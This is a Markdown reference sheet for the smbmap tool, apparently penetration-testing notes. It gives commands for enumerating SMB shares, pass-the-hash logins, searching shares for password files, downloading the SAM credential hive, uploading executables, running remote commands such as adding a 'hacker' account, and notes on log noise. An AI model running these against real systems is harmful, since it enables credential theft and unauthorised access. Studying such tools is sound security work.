# smbmap

**Tags:** `#smbmap` `#smb` `#lateral` `#enumeration` `#filetransfer` `#passthehash`

SMB enumeration and interaction tool — lists shares, checks permissions, recursively searches directories, and downloads/uploads files. Faster than smbclient for enumeration tasks since it maps all shares and permissions in one shot. Shows read/write access per share automatically.

**Source:** https://github.com/ShawnDEvans/smbmap — pre-installed on Kali

```bash
# List shares and permissions
smbmap -H 192.168.1.10 -u user -p Password
```

---

## Share Enumeration

```bash
# Null session
smbmap -H 192.168.1.10
smbmap -H 192.168.1.10 -u '' -p ''

# Authenticated
smbmap -H 192.168.1.10 -u Administrator -p Password
smbmap -H 192.168.1.10 -u 'DOMAIN\user' -p Password -d DOMAIN

# Pass the Hash
smbmap -H 192.168.1.10 -u Administrator -p '' --pw-nt-hash NTLMhash

# Kerberos
smbmap -H dc01.domain.local -k

# Subnet scan
smbmap -H 192.168.1.0/24 -u Administrator -p Password

# From hosts file
smbmap -H hosts.txt -u Administrator -p Password
```

**Output shows:** Share name, permissions (READ / READ, WRITE), and comment.

---

## Directory Listing

```bash
# List contents of a share
smbmap -H 192.168.1.10 -u user -p Password -r 'sharename'

# Recursive listing
smbmap -H 192.168.1.10 -u user -p Password -R 'sharename'

# Specific path
smbmap -H 192.168.1.10 -u user -p Password -r 'sharename\subdir'

# List with depth limit
smbmap -H 192.168.1.10 -u user -p Password -R 'sharename' --depth 3

# C$ drive listing
smbmap -H 192.168.1.10 -u Administrator -p Password -r 'C$'
smbmap -H 192.168.1.10 -u Administrator -p Password -R 'C$\Users'
```

---

## File Search

```bash
# Search for files by pattern (regex)
smbmap -H 192.168.1.10 -u user -p Password -R 'share' -A '.*\.xml'
smbmap -H 192.168.1.10 -u user -p Password -R 'share' -A 'password'
smbmap -H 192.168.1.10 -u user -p Password -R 'C$' -A '.*(password|credential|secret).*' --depth 10

# Search across all shares
smbmap -H 192.168.1.10 -u Administrator -p Password -R -A 'Groups\.xml'
```

---

## File Download / Upload

```bash
# Download file (specify share\path)
smbmap -H 192.168.1.10 -u user -p Password --download 'share\path\file.txt'
smbmap -H 192.168.1.10 -u Administrator -p Password --download 'C$\Windows\System32\config\SAM'

# Upload file
smbmap -H 192.168.1.10 -u Administrator -p Password --upload '/tmp/tool.exe' 'C$\Windows\Temp\tool.exe'
```

---

## Command Execution

```bash
# Execute command via SMB (requires admin)
smbmap -H 192.168.1.10 -u Administrator -p Password -x 'whoami'
smbmap -H 192.168.1.10 -u Administrator -p Password -x 'net user hacker Password /add'
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-H` | Target host or CIDR |
| `-u` | Username |
| `-p` | Password |
| `-d` | Domain |
| `--pw-nt-hash` | Treat `-p` as NT hash |
| `-r` | List directory (non-recursive) |
| `-R` | Recursive listing |
| `-A <regex>` | Search for files matching pattern |
| `--depth <n>` | Recursion depth |
| `--download` | Download file |
| `--upload` | Upload file |
| `-x` | Execute command |
| `-k` | Kerberos auth |
| `-q` | Quiet (no banner) |

---

## OPSEC Notes

- Share enumeration generates Event ID **4624** (logon type 3) per host
- Recursive search (`-R`) generates many file access events if object auditing is enabled
- `-A` pattern search reads file metadata to match — triggers access events on matching files
- Subnet scanning (`-H 192.168.1.0/24`) hits every host — noisy, generates many auth events

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
